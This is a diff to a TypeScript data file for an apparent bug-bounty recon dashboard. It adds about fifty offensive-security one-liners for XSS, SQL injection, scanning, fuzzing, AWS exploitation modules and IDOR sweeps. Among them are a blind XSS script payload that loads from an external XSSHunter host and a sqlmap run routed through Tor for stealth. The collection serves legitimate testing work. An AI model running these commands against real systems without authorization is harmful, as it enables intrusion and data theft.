@@ -175,7 +175,129 @@ export const ONELINERS_DATA = [
   {c:'misc',n:'Anew Dedupe Pipeline',d:'Append-only deduplicate stream',t:['bash'],q:'subfinder -d example.com -silent | anew subs.txt'},
   {c:'misc',n:'Interlace Parallel',d:'Parallelize any tool over targets',t:['bash'],q:'interlace -tL targets.txt -threads 50 -c "nuclei -u _target_ -o _target_.txt" -v'},
   {c:'misc',n:'Tmux Recon Workspace',d:'Multi-pane recon launcher',t:['bash'],q:'tmux new -s recon \\; split-window -h \\; split-window -v \\; select-pane -t 0 \\; send-keys "subfinder -d example.com" C-m'},
+
+  // ══════════ NEW IN v15 — 50+ ADDITIONAL ONELINERS ══════════
+
+  // ── XSS deep dive ──
+  {c:'xss',n:'KXSS Reflection',d:'Find reflected parameters with kxss',t:['bash'],q:'cat allurls.txt | kxss | tee kxss.txt'},
+  {c:'xss',n:'Dalfox Mass Scan',d:'Mass DOM/Reflected XSS via Dalfox',t:['bash'],q:'dalfox file urls.txt --skip-bav --silence -o dalfox.txt'},
+  {c:'xss',n:'XSStrike Smart',d:'XSStrike intelligent payload generation',t:['py'],q:'python3 xsstrike.py -u "https://example.com/?q=1" --crawl -l 3'},
+  {c:'xss',n:'Blind XSS Payload',d:'Inject XSSHunter blind payload',t:['bash'],q:'echo \'"><script src="//yourxss.xss.ht"></script>\' | xclip -selection clipboard'},
+
+  // ── SQLi deep dive ──
+  {c:'sqli',n:'GhAuri Tamper',d:'GhAuri SQLi automation w/ tampers',t:['bash'],q:'ghauri -u "https://example.com/?id=1" --batch --level 3 --risk 3 --tamper space2comment'},
+  {c:'sqli',n:'NoSQLi Detect',d:'NoSQL injection via NoSQLMap',t:['py'],q:'python3 nosqlmap.py -u "https://example.com/api?user=admin"'},
+  {c:'sqli',n:'SQLMap Tor Stealth',d:'Run sqlmap behind Tor with random agent',t:['bash'],q:'sqlmap -u "https://example.com/?id=1" --tor --tor-type=SOCKS5 --random-agent --batch --level=5 --risk=3'},
+
+  // ── Recon multi-tool pipelines ──
+  {c:'subdomain',n:'OneForAll Mega',d:'Heavy multi-source subdomain enum',t:['py'],q:'python3 oneforall.py --target example.com run'},
+  {c:'subdomain',n:'Sublist3r Quick',d:'Classic sublist3r enumeration',t:['py'],q:'sublist3r -d example.com -t 100 -o sublist3r.txt'},
+  {c:'subdomain',n:'Knockpy Scan',d:'Knockpy subdomain scan w/ wordlist',t:['py'],q:'knockpy example.com -w wordlist.txt -j -o knock.json'},
+  {c:'subdomain',n:'crobat -s passive',d:'Crobat passive Sonar lookup',t:['bash'],q:'crobat -s example.com | sort -u > crobat.txt'},
+
+  // ── Port scanning ──
+  {c:'live',n:'Nmap Service Detect',d:'Nmap top ports w/ service detection',t:['bash'],q:'nmap -sV -sC --top-ports 1000 -iL live.txt -oN nmap.txt'},
+  {c:'live',n:'Masscan Mass Scan',d:'Masscan internet-wide rate-limited',t:['bash'],q:'masscan -iL live.txt -p1-65535 --rate 5000 -oG masscan.txt'},
+  {c:'live',n:'Rustscan Fast',d:'Rustscan w/ Nmap pipe',t:['bash'],q:'rustscan -a 192.168.1.0/24 --ulimit 5000 -- -A -sC'},
+  {c:'live',n:'Smap Shodan-fast',d:'Stealth fast scan via Smap',t:['bash'],q:'smap -iL live.txt -oN smap.txt'},
+
+  // ── Fuzzing ──
+  {c:'dirs',n:'FFUF VHost Fuzz',d:'Virtual host bruteforce',t:['bash'],q:'ffuf -u https://example.com -H "Host: FUZZ.example.com" -w subdomains.txt -fs 0'},
+  {c:'dirs',n:'FFUF Recursive Brute',d:'Recursive content discovery',t:['bash'],q:'ffuf -u https://example.com/FUZZ -w raft.txt -recursion -recursion-depth 3 -e .bak,.old,.zip,.tar.gz'},
+  {c:'dirs',n:'Feroxbuster Recursive',d:'Recursive directory bruteforce',t:['bash'],q:'feroxbuster -u https://example.com -w wordlist.txt -t 50 --depth 4 -x php,html,bak'},
+  {c:'dirs',n:'Gobuster Vhost',d:'Virtual hosts via gobuster',t:['bash'],q:'gobuster vhost -u https://example.com -w subdomains.txt -t 50'},
+
+  // ── Params + secrets ──
+  {c:'params',n:'X8 Hidden Params',d:'X8 hidden parameter discovery',t:['bash'],q:'x8 -u "https://example.com/api" -w params.txt -X GET --one-worker-per-arg'},
+  {c:'apikey',n:'Nuclei Secrets',d:'Run Nuclei exposure/secret templates',t:['bash'],q:'nuclei -l live.txt -t exposures/ -t exposed-tokens/ -severity high,critical'},
+  {c:'apikey',n:'JS Beautify + grep',d:'Beautify JS then grep secrets',t:['bash'],q:'js-beautify main.js | grep -E "api[_-]?key|secret|token|password" -i'},
+
+  // ── Header / SSL ──
+  {c:'misc',n:'TLS Cipher Audit',d:'testssl.sh full audit',t:['bash'],q:'testssl.sh --severity HIGH --jsonfile-pretty=tls.json https://example.com'},
+  {c:'misc',n:'SSL Labs CLI',d:'CLI SSL grade lookup',t:['bash'],q:'ssllabs-scan --quiet example.com'},
+  {c:'misc',n:'CSP Evaluator',d:'Audit CSP via Google evaluator API',t:['bash'],q:"curl -s 'https://csp-evaluator.withgoogle.com/checkcsp?csp=$(curl -sI https://example.com | grep -i content-security)'"},
+  {c:'misc',n:'HSTS Preload Check',d:'Check HSTS preload status',t:['bash'],q:'curl -s "https://hstspreload.org/api/v2/status?domain=example.com" | jq'},
+
+  // ── DNS deep ──
+  {c:'subdomain',n:'DNSEnum Full',d:'Brute + zone transfer + reverse',t:['bash'],q:'dnsenum --enum -f wordlist.txt -r example.com'},
+  {c:'subdomain',n:'Fierce DNS',d:'Fierce DNS reconnaissance',t:['bash'],q:'fierce --domain example.com --subdomain-file wordlist.txt'},
+  {c:'subdomain',n:'AXFR Zone Transfer',d:'Try AXFR on every NS',t:['bash'],q:'for ns in $(dig +short ns example.com); do dig axfr example.com @$ns; done'},
+
+  // ── Cloud + container ──
+  {c:'cloud',n:'CloudFox AWS Inv',d:'CloudFox AWS post-exploit recon',t:['bash'],q:'cloudfox aws --profile target --no-cache all-checks'},
+  {c:'cloud',n:'Pacu Modules',d:'Run Pacu AWS exploitation modules',t:['py'],q:'pacu --session target --module-name iam__enum_users_roles_policies_groups'},
+  {c:'cloud',n:'kube-hunter Remote',d:'Find Kubernetes attack surface',t:['py'],q:'kube-hunter --remote example.com --report json'},
+  {c:'cloud',n:'kubeaudit All',d:'Audit cluster against K8s best-practice',t:['bash'],q:'kubeaudit all --kubeconfig ~/.kube/config'},
+  {c:'cloud',n:'Trivy Image Scan',d:'Container vulnerability scan',t:['bash'],q:'trivy image --severity HIGH,CRITICAL example/app:latest'},
+
+  // ── CVE / exploit ──
+  {c:'cve',n:'Nuclei Latest CVEs',d:'Run latest CVE templates',t:['bash'],q:'nuclei -l live.txt -tags cve -severity critical,high -rl 100 -c 50'},
+  {c:'cve',n:'Vulscan Nmap',d:'Nmap vulscan NSE script',t:['bash'],q:'nmap -sV --script=vulscan/vulscan.nse example.com'},
+  {c:'cve',n:'searchsploit JSON',d:'Searchsploit with JSON output',t:['bash'],q:'searchsploit -j "wordpress 6"'},
+
+  // ── Bug Bounty automation ──
+  {c:'misc',n:'ReconFTW Full',d:'Full reconftw automation',t:['bash'],q:'./reconftw.sh -d example.com -r --deep -o /tmp/recon'},
+  {c:'misc',n:'Axiom Distributed',d:'Distributed scanning via Axiom',t:['bash'],q:'axiom-scan urls.txt -m nuclei -severity critical,high -o nuclei_axiom.txt'},
+  {c:'misc',n:'BBOT Black-box',d:'BBOT recursive bug-hunter',t:['bash'],q:'bbot -t example.com -f subdomain-enum,cloud-enum,email-enum,web-basic'},
+
+  // ── Mobile ──
+  {c:'misc',n:'APKLeaks Secrets',d:'Find secrets in APK',t:['bash'],q:'apkleaks -f app.apk -o apkleaks.txt'},
+  {c:'misc',n:'MobSF Static Scan',d:'Run MobSF static scan',t:['bash'],q:'curl -F "file=@app.apk" -H "Authorization:$MOBSF_KEY" http://localhost:8000/api/v1/upload'},
+
+  // ── Authentication / IDOR ──
+  {c:'auth',n:'Autorize Burp',d:'Autorize burp extension setup',t:['bash'],q:'echo "Configure Autorize with low-priv cookie, then crawl as admin"'},
+  {c:'auth',n:'IDOR Numeric Sweep',d:'Iterate IDs to detect IDOR',t:['bash'],q:'for i in $(seq 1 1000); do curl -s -o /dev/null -w "%{http_code} $i\\n" "https://example.com/user/$i"; done | grep ^200'},
+  {c:'race',n:'Turbo Intruder',d:'Burp Turbo Intruder race script',t:['py'],q:'engine = RequestEngine(endpoint="https://example.com/redeem", concurrentConnections=30, requestsPerConnection=100, pipeline=False)'},
+
+  // ── GraphQL ──
+  {c:'graphql',n:'Clairvoyance Schema',d:'Brute schema even when introspection off',t:['py'],q:'clairvoyance https://example.com/graphql -w wordlist.txt -o schema.json'},
+  {c:'graphql',n:'GraphQL Voyager',d:'Visualize the schema',t:['bash'],q:'inql -t https://example.com/graphql -o graphql_dump'},
+
+  // ── New: Phishing / impersonation ──
+  {c:'osint',n:'Dnstwist Permutation',d:'Find lookalike domains',t:['bash'],q:'dnstwist --registered example.com -f json > dnstwist.json'},
+  {c:'osint',n:'URLCrazy Variants',d:'Detect domain typosquats',t:['bash'],q:'urlcrazy example.com'},
+
+  // ── Misc QoL ──
+  {c:'misc',n:'HTTP Smuggler',d:'HTTP request smuggling detection',t:['py'],q:'python3 smuggler.py -u https://example.com/'},
+  {c:'misc',n:'Cache-Snoop',d:'Web cache deception probe',t:['bash'],q:'curl -I "https://example.com/account.css" -H "Cookie: session=$SESS"'},
+  {c:'misc',n:'Notify Discord',d:'Pipe results to Discord webhook',t:['bash'],q:'cat critical.txt | notify -bulk -id discord'},
+  {c:'misc',n:'Project Discovery All',d:'Install all PD tools at once',t:['bash'],q:'go install -v github.com/projectdiscovery/{subfinder,httpx,nuclei,naabu,dnsx,katana,tlsx,asnmap,cvemap,interactsh-client}/v2/cmd/...@latest'},
 ];
+
+// Module mapping — links each oneliner category to the Recon dashboard tab
+export const MODULE_LINKS: Record<string, { tab: string; label: string }> = {
+  subdomain: { tab: 'sub',       label: '🌐 Subdomains' },
+  asn:       { tab: 'ips',       label: '📍 Unique IPs' },
+  live:      { tab: 'probe',     label: '⚡ Probe' },
+  urls:      { tab: 'ep',        label: '🔗 Endpoints' },
+  vuln:      { tab: 'nuclei',    label: '☠ Nuclei' },
+  params:    { tab: 'params',    label: '🔑 Params' },
+  dirs:      { tab: 'content',   label: '📁 Content' },
+  cors:      { tab: 'cors',      label: '↔ CORS' },
+  takeover:  { tab: 'takeover',  label: '⚠ Takeover' },
+  git:       { tab: 'ghleaks',   label: '📂 GH Leaks' },
+  ssrf:      { tab: 'vuln',      label: '🔄 Vulns' },
+  lfi:       { tab: 'vuln',      label: '📄 Vulns' },
+  xxe:       { tab: 'vuln',      label: '🧬 Vulns' },
+  ssti:      { tab: 'ssti',      label: '📐 SSTI/SQLi' },
+  xss:       { tab: 'domxss',    label: '💢 DOM XSS' },
+  sqli:      { tab: 'ssti',      label: '💉 SSTI/SQLi' },
+  auth:      { tab: 'authmap',   label: '🔑 AuthMap' },
+  race:      { tab: 'race',      label: '⚡ Race' },
+  graphql:   { tab: 'graphql',   label: '◉ GraphQL' },
+  apikey:    { tab: 'secrets',   label: '🗝 Secrets' },
+  waf:       { tab: 'hdrs',      label: '🛡 Headers' },
+  cloud:     { tab: 'cloud',     label: '☁ Cloud' },
+  k8s:       { tab: 'cloud',     label: '☁ Cloud' },
+  jwt:       { tab: 'jwt',       label: '🎫 JWT' },
+  osint:     { tab: 'intel',     label: '🔭 Intel' },
+  cve:       { tab: 'exploits',  label: '💣 Exploits' },
+  privesc:   { tab: 'vuln',      label: '⬆ Vulns' },
+  lateral:   { tab: 'intel',     label: '↔ Intel' },
+  ws:        { tab: 'methods',   label: '🔌 Methods' },
+  ai:        { tab: 'vuln',      label: '🤖 Vulns' },
+  misc:      { tab: 'risk',      label: '📊 Score' },
+};
 
 export const SECTION_NAMES: Record<string, string> = {
   subdomain: '🌐 Subdomain Enumeration',
@@ -212,3 +334,4 @@ export const SECTION_NAMES: Record<string, string> = {
 };
 
 export const CATEGORIES = Object.keys(SECTION_NAMES);
+
